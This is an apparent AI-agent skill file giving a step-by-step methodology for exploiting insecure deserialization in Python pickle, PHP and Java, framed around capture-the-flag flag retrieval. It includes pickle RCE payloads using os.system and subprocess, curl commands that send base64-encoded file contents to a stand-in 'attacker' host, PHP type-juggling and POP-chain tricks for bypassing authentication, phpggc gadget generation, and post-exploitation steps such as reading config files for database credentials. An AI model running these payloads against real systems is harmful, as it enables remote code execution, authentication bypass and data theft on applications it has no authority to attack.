---
name: deserialization-methodology
description: "Insecure deserialization vulnerability exploitation. Use when you find Base64-encoded cookies/parameters, Python pickle data, PHP serialized strings (O:4:...), or Java serialized data (rO0AB...). You can achieve RCE directly"
zh-signals: "识别并利用不安全反序列化漏洞（Python pickle、PHP serialize、Java/.NET 序列化）以获取远程代码执行。信号:反序列化,pickle,PHP,Java,RCE"
when-to-use: "Use when you find Base64-encoded cookies or parameters, Python pickle bytes, PHP serialized strings (O:4:...), or Java serialized data (rO0AB) and need a deserialization exploitation path."
metadata:
  tags: "insecure_deserialization,deserialization,insecure deserialization,pickle,unserialize,php,java,rce"
  category: "exploit"
---

# Deserialization Vulnerability Methodology

## Further Reading

- Pickle payload template library (reflected / blind / file upload / delivery methods) → [references/pickle-payload-templates.md](references/pickle-payload-templates.md)
- RCE succeeded but no output? Blind exploitation OOB exfiltration strategy → [references/blind-exploitation.md](references/blind-exploitation.md)
- PHP deserialization details (POP chain / type juggling / phpggc) → [references/php-deserialization.md](references/php-deserialization.md)
- .NET deserialization exploitation (ViewState / BinaryFormatter / ysoserial.net) → [references/dotnet-deserialization.md](references/dotnet-deserialization.md)

## Phase 1: Detect Deserialization Entry Points

Common locations: cookie values, POST body, hidden form fields (viewstate), API parameters, file uploads

**Format signatures (magic bytes)**:

| Format | Identification feature | Next step |
|------|----------|--------|
| Python Pickle | Starts with `\x80` after base64 decoding, or contains `cos\n` (magic bytes) | → Phase 2 |
| PHP | Format `O:4:"User":2:{` or `a:N:{` | → Phase 3 |
| Java | Starts with `\xac\xed\x00\x05` after base64 decoding (magic bytes), or base64 starting with `rO0AB` | Java deserialization exploitation |

1. Extract the values of all cookies and hidden fields, and try base64 decoding them
2. Check the `Content-Type` header: `application/x-python-pickle`, `application/x-java-serialized-object`
3. Observe whether error messages contain keywords such as `pickle`, `unserialize`, `ObjectInputStream`
4. Upload serialized file formats such as `.pkl` and `.ser`, and observe the server-side behaviour
5. Modify field values in the serialized data and observe the response change to confirm the server actually deserialized the input

## Phase 2: Python Pickle RCE

⚠️ **Key constraint**: `__reduce__` can only return `(module-level function, argument tuple)` — `self.method` will fail

1. Build a basic RCE payload: use the `__reduce__` method to call `os.system` or `subprocess.check_output`
2. Reflected payload: `subprocess.check_output(['cat', '/flag.txt'])` — see the result directly in the response
3. Blind payload: `os.system('cp /flag.txt /app/static/f.txt')` — write the file to a web-accessible path
4. OOB payload: `os.system('curl http://attacker/?d=$(cat /flag|base64)')` — exfiltrate the data over HTTP
5. Serialize and encode: `base64.b64encode(pickle.dumps(payload))`, then replace the original data and send it
6. Mind Python version differences: the pickle protocol versions of Python 2/3 differ, so `protocol=2` may be required

Common trigger points: Flask session, Redis session, `Content-Type: application/x-python-pickle`, `.pkl` file upload

Decision tree: reflected payload → if there is no output, write the file to a web path → if it still fails, read the blind exploitation reference
→ full templates → read `references/pickle-payload-templates.md`

## Phase 3: PHP Deserialization

1. Identify the serialized string format: `O:4:"User":2:{s:4:"name";s:5:"admin";s:4:"role";s:4:"user";}`
2. Type juggling quick reference: `b:1` (boolean true) with loose comparison `==` can bypass arbitrary password validation
3. Modify property values: directly modify the fields in the serialized string (note that the length prefix `s:N:` must match)
4. POP chain construction: find a class with a controllable property (e.g. calling `file_put_contents` in `__destruct`), and use chained property control to achieve arbitrary file write or command execution
5. phpggc tool: `phpggc <framework>/<gadget> <type> <arg>` automatically generates exploit chains for common frameworks
6. Common framework gadgets: Laravel (RCE), Symfony (file write), WordPress (object injection)
→ full POP chain / type juggling / phpggc usage → read `references/php-deserialization.md`

## Phase 4: Flag Retrieval

1. After successful deserialization RCE, execute first: `cat /flag.txt`, `cat /FLAG.txt`
2. List directories to search: `ls /` → `find / -name "*flag*" 2>/dev/null`
3. Environment variables: `env | grep -i flag`
4. When there is no output, write to a web path: `cp /flag* /app/static/flag.txt`, then access it over HTTP
5. DNS/HTTP exfiltration: `curl http://attacker/$(cat /flag|base64)`
6. Check the database: `cat /app/config*` to get the connection information, then query the flag table
